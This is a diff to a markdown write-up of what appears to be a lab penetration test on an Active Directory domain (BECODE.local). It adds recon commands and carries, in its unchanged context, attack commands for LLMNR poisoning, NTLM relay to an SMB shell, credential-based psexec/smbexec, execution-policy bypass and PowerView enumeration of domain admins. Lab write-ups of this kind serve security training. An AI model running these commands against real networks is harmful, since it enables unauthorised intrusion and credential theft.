@@ -34,6 +34,16 @@ Once that's done, we have the necessary credentials to connect to the network an
 
 Once connected to the network, we can run a nmap scan to find an attack surface and start exploiting it. We can also figure out the Domain name, in this case BECODE.local.
 
+> sudo netdiscover -r 10.10.71.0/24
+
+[]()
+
+> nmap -Pn 10.10.71.199
+
+[]()
+
+> rpcclient -U "" -N 10.10.71.199
+
 []()
 
 ## 2. LLMNR Poisoning
@@ -103,6 +113,7 @@ If the attack succeeds on a target we'll end up with the machine's sam hashes. T
 Another way of attacking can be to launch our ntlmrelayx with the `-i` flag to straight up pop a samba shell and listen for it with netcat.
 
 > ntlmrelayx.py -tf targets.txt -smb2support -i
+
 > nc 127.0.0.1 11000
 
 This allows us to browse the file system or even download/upload files on it.
@@ -120,7 +131,9 @@ We managed to execute this whoami command once at the very end of last week but 
 We tried different scripts from the impacket-tools or msfconsole.
 
 > msfconsole ==> exploit/windows/smb/psexec
+
 > psexec.py lab.local/user:password@ip
+
 > smbexec.py lab.local/user:password@ip
 
 Those were not working but abusing the Windows Management Instrumentation did the trick:
@@ -160,6 +173,7 @@ That's when we switched to a situation where we wouldn't be considered as extern
 Here we wanted to gather information about the domain. So we used powerview !
 
 > powershell -ep bypass
+
 > . .\PowerView.ps1
 
 []()
@@ -167,6 +181,7 @@ Here we wanted to gather information about the domain. So we used powerview !
 Amongst the commands that can get us interesting information we have:
 
 > Get-NetGroupMember "Domain Admins"
+
 > Get-NetUser | select samaccountname, description
 
 []()
